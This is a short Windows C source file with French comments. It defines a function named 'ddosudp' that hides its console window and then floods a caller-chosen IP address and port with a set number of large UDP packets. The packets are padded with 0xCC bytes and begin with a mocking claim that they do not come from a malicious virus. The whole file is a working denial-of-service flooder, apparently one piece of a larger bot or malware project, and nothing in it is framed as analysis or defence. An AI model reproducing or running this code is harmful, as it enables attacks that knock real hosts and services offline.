#include "proto.h"
#include <winsock2.h>
#include <stdio.h>

int ddosudp(int port, char * addrip, int nbpackets, int sizepacket, int delai )
{
	FreeConsole(); // Cacher la consoles win
    WSADATA WSAData;
    WSAStartup(MAKEWORD(2,0), &WSAData);

    /* - Initialisation du socket - */

	BYTE data[sizepacket]; // Création d'un tableau de byte de taille 0xFFFF -> Soit 65535 bytes -> 64kb
	memset(data,0xCC,sizepacket); // Remplis le tableau de byte de 0xCC 0xFFFF foisl


	strcpy( (char*) data, "Ceci n'est pas issu d'un virus malveillant !"); // Rajoute "Pacquet Malveillant" au debut du packet

	SOCKET sock;
	SOCKADDR_IN sin;
	sin.sin_addr.s_addr    = inet_addr(addrip);
	sin.sin_family        = AF_INET;
	sin.sin_port        = htons(port);
	sock = socket(AF_INET,SOCK_DGRAM,0);

	for ( int i=0; i<nbpackets; i++ )
	{
		sendto(sock, data, sizepacket, 0, (SOCKADDR*) &sin, sizeof(sin));
		Sleep( delai );

	}

	closesocket(sock);
	/* - Fermeture du socket - */
    WSACleanup();
    return 0;

}